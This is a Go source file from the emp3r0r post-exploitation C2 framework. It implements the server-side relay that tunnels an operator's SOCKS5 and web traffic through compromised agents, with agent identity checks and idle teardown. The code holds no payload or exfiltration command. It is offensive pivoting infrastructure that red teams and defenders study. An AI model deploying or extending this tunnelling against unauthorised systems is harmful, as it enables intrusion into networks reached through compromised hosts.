package server

import (
	"context"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

type relayStream struct {
	ownerSession string
	conn         io.ReadWriteCloser
	writeMu      sync.Mutex
	done         chan struct{}
	doneOnce     sync.Once
}

func (rs *relayStream) signalDone() {
	if rs == nil || rs.done == nil {
		return
	}
	rs.doneOnce.Do(func() {
		close(rs.done)
	})
}

var (
	proxyRelayStreams sync.Map // map[token]*relayStream
	wwwRelayStreams   sync.Map // map[streamID]*relayStream
)

func verifyAuxRouteAgent(agentUUID, remoteAddr, route string) bool {
	if agentUUID == "" {
		logging.Errorf("%s relay: blocked stream from %s with empty agentUUID", route, remoteAddr)
		return false
	}
	if agents.AgentDB == nil {
		logging.Errorf("%s relay: AgentDB unavailable for %s from %s", route, strconv.Quote(agentUUID), remoteAddr)
		return false
	}
	pinnedKey, _, found, lookupErr := agents.GetPinnedIdentity(agentUUID)
	if lookupErr != nil {
		logging.Errorf("CRITICAL: %s relay: AgentDB lookup failed for %s from %s: %v", route, strconv.Quote(agentUUID), remoteAddr, lookupErr)
		return false
	}
	if !found || pinnedKey == "" {
		logging.Errorf("CRITICAL: %s relay: agent %s not enrolled or has empty pinned key from %s", route, strconv.Quote(agentUUID), remoteAddr)
		return false
	}
	_ = agents.UpdateSessionHeartbeat(agentUUID)
	return true
}

// handleProxyRelayStream is the C2-side endpoint of a SOCKS5 pivot relay.
// The agent opened this stream (Proxy route) after successfully dialing the
// requested target; its token identifies the operator-side SOCKS5 connection
// that is waiting for it. Once matched, the C2 answers the SOCKS5 CONNECT and
// acts as a pure byte relay between the two.
func handleProxyRelayStream(conn io.ReadWriteCloser, agentUUID, streamID, remoteAddr string, cancel context.CancelFunc) {
	defer cancel()
	defer conn.Close()

	if !verifyAuxRouteAgent(agentUUID, remoteAddr, "proxy") {
		return
	}
	streamID = strings.TrimSpace(streamID)
	if streamID == "" {
		logging.Errorf("CRITICAL: proxy relay: empty stream id from %s", remoteAddr)
		return
	}

	entry := lookupPendingProxyEntry(streamID)
	if entry == nil {
		logging.Errorf("CRITICAL: proxy relay: unknown token %q from %s (timeout or spoofed)", streamID, remoteAddr)
		return
	}
	if entry.agentUUID != agentUUID {
		logging.Errorf("CRITICAL: proxy relay: agent %s hijacked token %q owned by %s", strconv.Quote(agentUUID), streamID, strconv.Quote(entry.agentUUID))
		return
	}

	// The agent dials the target BEFORE opening this stream, so its arrival is
	// the CONNECT acknowledgement — answer the operator now.
	entry.markStreamUp(conn)
	// The outcome is decided: no dial-failure response will follow, so drop the
	// job bookkeeping we registered when ordering the agent.
	clearProxyJobBookkeeping(streamID)
	if err := socks5Reply(entry.sock, socks5RepSuccess); err != nil {
		logging.Errorf("proxy relay: CONNECT reply failed for %q: %v", streamID, err)
		entry.teardown()
		return
	}
	logging.Infof("SOCKS5 relay for %q established (agent %s)", streamID, strconv.Quote(agentUUID))

	relaySOCKS5Stream(entry.sock, conn, streamID)
	logging.Debugf("proxy relay for %q finished", streamID)
	entry.teardown()
}

// relaySOCKS5Stream pumps bytes between the operator-side SOCKS5 connection
// and the agent's relay stream. Data flow in either direction resets the idle
// timer; when the relay stays idle for socks5RelayIdleTimeout (or either leg
// finishes) both connections are closed so nothing lingers. The caller owns
// the surrounding bookkeeping (pending entry etc.) and calls teardown after
// this returns.
func relaySOCKS5Stream(sock net.Conn, stream io.ReadWriteCloser, token string) {
	var lastActivity atomic.Int64
	lastActivity.Store(time.Now().UnixNano())
	touch := func() { lastActivity.Store(time.Now().UnixNano()) }

	copyLoop := func(dst io.Writer, src io.Reader) {
		buf := make([]byte, 64*1024)
		for {
			n, rerr := src.Read(buf)
			if n > 0 {
				touch()
				if _, werr := dst.Write(buf[:n]); werr != nil {
					return
				}
			}
			if rerr != nil {
				return
			}
		}
	}

	done := make(chan struct{}, 2)
	go func() {
		copyLoop(sock, stream) // agent stream -> operator
		done <- struct{}{}
	}()
	go func() {
		copyLoop(stream, sock) // operator -> agent stream
		done <- struct{}{}
	}()

	watch := time.NewTicker(socks5RelayWatchInterval)
	defer watch.Stop()
	for {
		select {
		case <-done:
			// One leg finished: close both so the other unblocks.
			_ = sock.Close()
			_ = stream.Close()
			return
		case <-watch.C:
			if time.Since(time.Unix(0, lastActivity.Load())) > socks5RelayIdleTimeout {
				logging.Infof("SOCKS5 relay %s idle for %s, tearing down", token, socks5RelayIdleTimeout)
				_ = sock.Close()
				_ = stream.Close()
				return
			}
		}
	}
}

func handleWWWRelayStream(conn io.ReadWriteCloser, agentUUID, streamID, remoteAddr string) {
	if !verifyAuxRouteAgent(agentUUID, remoteAddr, "www") {
		conn.Close()
		return
	}
	streamID = strings.TrimSpace(streamID)
	if streamID == "" {
		logging.Errorf("CRITICAL: www relay: empty stream id from %s", remoteAddr)
		conn.Close()
		return
	}

	ownerSession, err := getOnlyOperatorSession()
	if err != nil {
		logging.Errorf("CRITICAL: www relay: %v", err)
		conn.Close()
		return
	}

	rs := &relayStream{ownerSession: ownerSession, conn: conn, done: make(chan struct{})}
	wwwRelayStreams.Store(streamID, rs)
	defer wwwRelayStreams.Delete(streamID)
	defer conn.Close()

	if err := fwdMsgToOperator(ownerSession, def.MsgTunData{Tag: def.TagWWWRelayRequestPrefix + streamID}); err != nil {
		logging.Errorf("CRITICAL: www relay: request forwarding failed for %q: %v", streamID, err)
		return
	}

	// Keep this stream alive until operator finishes or errors; otherwise agent receives EOF with empty body.
	<-rs.done
}

func getOnlyOperatorSession() (string, error) {
	count := 0
	session := ""
	OPERATORS.Range(func(key, _ any) bool {
		count++
		session, _ = key.(string)
		return true
	})
	if count != 1 || session == "" {
		return "", fmt.Errorf("www relay requires exactly one active operator session (have %d)", count)
	}
	return session, nil
}

func handleOperatorRelayFrame(operatorSession string, msg *def.MsgTunData) {
	if msg == nil {
		return
	}
	tag := msg.Tag
	switch {
	case strings.HasPrefix(tag, def.TagProxyRelayBackPrefix):
		streamID := strings.TrimPrefix(tag, def.TagProxyRelayBackPrefix)
		if val, ok := proxyRelayStreams.Load(streamID); ok {
			rs := val.(*relayStream)
			if rs.ownerSession != operatorSession {
				logging.Errorf("CRITICAL: proxy relay owner mismatch for %q", streamID)
				return
			}
			rs.writeMu.Lock()
			_, _ = rs.conn.Write(msg.Response)
			rs.writeMu.Unlock()
		}
	case strings.HasPrefix(tag, def.TagProxyRelayDonePrefix):
		streamID := strings.TrimPrefix(tag, def.TagProxyRelayDonePrefix)
		if val, ok := proxyRelayStreams.Load(streamID); ok {
			rs := val.(*relayStream)
			if rs.ownerSession == operatorSession {
				_ = rs.conn.Close()
			}
		}
	case strings.HasPrefix(tag, def.TagWWWRelayDataPrefix):
		streamID := strings.TrimPrefix(tag, def.TagWWWRelayDataPrefix)
		if val, ok := wwwRelayStreams.Load(streamID); ok {
			rs := val.(*relayStream)
			if rs.ownerSession != operatorSession {
				logging.Errorf("CRITICAL: www relay owner mismatch for %q", streamID)
				return
			}
			rs.writeMu.Lock()
			_, err := rs.conn.Write(msg.Response)
			rs.writeMu.Unlock()
			if err != nil {
				logging.Errorf("CRITICAL: www relay write failed for %q: %v", streamID, err)
				wwwRelayStreams.Delete(streamID)
				rs.signalDone()
				_ = rs.conn.Close()
			}
		}
	case strings.HasPrefix(tag, def.TagWWWRelayDonePrefix):
		streamID := strings.TrimPrefix(tag, def.TagWWWRelayDonePrefix)
		if val, ok := wwwRelayStreams.LoadAndDelete(streamID); ok {
			rs := val.(*relayStream)
			if rs.ownerSession == operatorSession {
				rs.signalDone()
				_ = rs.conn.Close()
			}
		}
	case strings.HasPrefix(tag, def.TagWWWRelayErrorPrefix):
		streamID := strings.TrimPrefix(tag, def.TagWWWRelayErrorPrefix)
		logging.Errorf("WWW relay failed for %q: %s", streamID, string(msg.Response))
		if val, ok := wwwRelayStreams.LoadAndDelete(streamID); ok {
			rs := val.(*relayStream)
			if rs.ownerSession == operatorSession {
				rs.signalDone()
				_ = rs.conn.Close()
			}
		}
	}
}
